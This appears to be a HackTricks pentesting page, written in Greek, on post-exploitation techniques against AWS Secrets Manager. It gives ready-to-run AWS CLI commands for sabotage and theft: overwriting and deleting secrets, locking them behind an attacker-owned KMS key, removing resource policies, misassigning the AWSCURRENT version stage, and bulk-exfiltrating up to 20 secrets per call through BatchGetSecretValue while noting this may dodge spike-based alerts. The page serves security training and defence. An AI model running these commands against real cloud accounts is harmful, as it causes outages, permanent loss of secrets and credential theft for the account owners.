# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Ανάγνωση Secrets

Τα **secrets καθαυτά είναι ευαίσθητες πληροφορίες**, [ελέγξτε τη σελίδα privesc](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) για να μάθετε πώς να τα διαβάσετε.

### DoS Change Secret Value

Αλλάζοντας την τιμή του secret μπορείτε να **DoS όλα τα συστήματα που εξαρτώνται από αυτήν την τιμή.**

> [!WARNING]
> Σημειώστε ότι οι προηγούμενες τιμές αποθηκεύονται επίσης, οπότε είναι εύκολο να επιστρέψετε στην προηγούμενη τιμή.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Εάν ο επιτιθέμενος έχει την άδεια secretsmanager:UpdateSecret, μπορεί να ρυθμίσει το secret ώστε να χρησιμοποιεί ένα KMS key που ανήκει στον ίδιο. Το κλειδί αυτό αρχικά είναι διαμορφωμένο έτσι ώστε ο καθένας να μπορεί να το προσπελάσει και να το χρησιμοποιήσει, οπότε η ενημέρωση του secret με το νέο κλειδί είναι δυνατή. Αν το κλειδί δεν ήταν προσβάσιμο, το secret δεν θα μπορούσε να ενημερωθεί.

Μετά την αλλαγή του κλειδιού για το secret, ο επιτιθέμενος τροποποιεί τη διαμόρφωση του κλειδιού του ώστε μόνο αυτός να μπορεί να το προσπελάσει. Έτσι, στις επόμενες εκδόσεις του secret, αυτές θα κρυπτογραφούνται με το νέο κλειδί, και αφού δεν υπάρχει πρόσβαση σε αυτό, η δυνατότητα ανάκτησης του secret θα χαθεί.

Είναι σημαντικό να σημειωθεί ότι αυτή η μη προσβασιμότητα θα συμβεί μόνο στις μεταγενέστερες εκδόσεις, μετά την αλλαγή του περιεχομένου του secret, αφού η τρέχουσα έκδοση εξακολουθεί να είναι κρυπτογραφημένη με το αρχικό KMS key.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Διαγραφή Secret

Ο ελάχιστος αριθμός ημερών για να διαγραφεί ένα secret είναι 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Είναι δυνατή η επαναφορά ενός μυστικού, κάτι που επιτρέπει την ανάκτηση μυστικών που έχουν προγραμματιστεί για διαγραφή, καθώς η ελάχιστη περίοδος διαγραφής για μυστικά είναι 7 ημέρες και η μέγιστη 30 ημέρες. Σε συνδυασμό με το δικαίωμα secretsmanager:GetSecretValue, αυτό καθιστά δυνατή την ανάκτηση του περιεχομένου τους.

Για να ανακτήσετε ένα μυστικό που βρίσκεται σε διαδικασία διαγραφής, μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Αυτή η ενέργεια επιτρέπει τη διαγραφή της resource policy που ελέγχει ποιος μπορεί να έχει πρόσβαση σε ένα secret. Αυτό μπορεί να οδηγήσει σε DoS αν η resource policy είχε ρυθμιστεί ώστε να επιτρέπει πρόσβαση σε ένα συγκεκριμένο σύνολο χρηστών.

Για να διαγράψετε τη resource policy:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Οι καταστάσεις ενός μυστικού χρησιμοποιούνται για τη διαχείριση των εκδόσεων ενός μυστικού. Το AWSCURRENT σηματοδοτεί την ενεργή έκδοση που χρησιμοποιούν οι εφαρμογές, το AWSPREVIOUS διατηρεί την προηγούμενη έκδοση ώστε να μπορείτε να επαναφέρετε αν χρειαστεί, και το AWSPENDING χρησιμοποιείται στη διαδικασία περιστροφής για να προετοιμάσει και να επικυρώσει μια νέα έκδοση πριν την ορίσει ως τρέχουσα.

Οι εφαρμογές διαβάζουν πάντα την έκδοση με AWSCURRENT. Εάν κάποιος μετακινήσει αυτή την ετικέτα στη λάθος έκδοση, οι εφαρμογές θα χρησιμοποιήσουν άκυρα credentials και μπορεί να αποτύχουν.

Το AWSPREVIOUS δεν χρησιμοποιείται αυτόματα. Ωστόσο, αν το AWSCURRENT αφαιρεθεί ή ανατεθεί λανθασμένα, μπορεί να φαίνεται ότι όλα εξακολουθούν να λειτουργούν με την προηγούμενη έκδοση.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

Καταχραστείτε το Secrets Manager BatchGetSecretValue API για να ανακτήσετε έως και 20 μυστικά σε ένα αίτημα. Αυτό μπορεί να μειώσει δραστικά τον όγκο κλήσεων API σε σύγκριση με την εκτέλεση GetSecretValue για κάθε μυστικό. Αν χρησιμοποιούνται φίλτρα (tags/name), απαιτείται επίσης η άδεια ListSecrets. Το CloudTrail εξακολουθεί να καταγράφει ένα γεγονός GetSecretValue για κάθε μυστικό που ανακτάται σε παρτίδα.

Απαιτούμενα δικαιώματα
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue για κάθε στοχευμένο μυστικό
- secretsmanager:ListSecrets αν χρησιμοποιείτε --filters
- kms:Decrypt στα CMKs που χρησιμοποιούνται από τα μυστικά (αν δεν χρησιμοποιείτε aws/secretsmanager)

> [!WARNING]
> Λάβετε υπόψη ότι η άδεια `secretsmanager:BatchGetSecretValue` από μόνη της δεν αρκεί για την ανάκτηση μυστικών — χρειάζεστε επίσης την `secretsmanager:GetSecretValue` για κάθε μυστικό που θέλετε να ανακτήσετε.

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate με φίλτρα (tag key/value or name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
Διαχείριση μερικών αποτυχιών
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
Επιπτώσεις
- Γρήγορη “smash-and-grab” πολλών secrets με λιγότερες API κλήσεις, ενδεχομένως παρακάμπτοντας ειδοποιήσεις ρυθμισμένες για αιχμές του GetSecretValue.
- Τα CloudTrail logs εξακολουθούν να περιλαμβάνουν ένα GetSecretValue event ανά secret που ανακτάται από την παρτίδα.
